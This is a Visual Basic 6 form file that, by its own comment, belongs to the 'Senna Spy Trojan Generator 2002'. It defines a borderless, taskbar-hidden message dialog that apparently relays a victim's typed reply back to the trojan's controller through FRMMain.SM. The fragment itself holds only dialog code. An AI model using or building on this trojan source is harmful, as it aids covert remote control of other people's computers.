VERSION 5.00
Begin VB.Form FRMMSG
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   2040
   ClientLeft      =   90
   ClientTop       =   0
   ClientWidth     =   6855
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2040
   ScaleWidth      =   6855
   ShowInTaskbar   =   0   'False
   Begin VB.CommandButton Command1
      Caption         =   "&OK"
      Default         =   -1  'True
      Height          =   390
      Left            =   2760
      TabIndex        =   2
      Top             =   1575
      Width           =   1245
   End
   Begin VB.TextBox Text1
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Top             =   1080
      Width           =   6615
   End
   Begin VB.Label Label3
      Alignment       =   2  'Center
      AutoSize        =   -1  'True
      Caption         =   "Text:"
      Height          =   195
      Left            =   3330
      TabIndex        =   4
      Top             =   120
      Width           =   60
   End
   Begin VB.Label Label2
      Alignment       =   2  'Center
      AutoSize        =   -1  'True
      Caption         =   "Write your text:"
      Height          =   195
      Left            =   3330
      TabIndex        =   3
      Top             =   840
      Width           =   60
   End
   Begin VB.Label Label1
      BorderStyle     =   1  'Fixed Single
      Height          =   390
      Left            =   120
      TabIndex        =   1
      Top             =   390
      Width           =   6615
   End
End
Attribute VB_Name = "FRMMSG"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' Senna Spy Trojan Generator 2002
' The First Internet-Trojan Generator In The World !

Option Explicit

Private Sub Command1_Click()
   FRMMain.SM FRMMSG.Tag, ANSWER_MESSAGE & Text1.Text
   FRMMSG.Visible = False

   Unload Me
End Sub

Private Sub Form_Load()
End Sub

Private Sub Form_Unload(Cancel As Integer)
   FRMMSG.Visible = False
End Sub
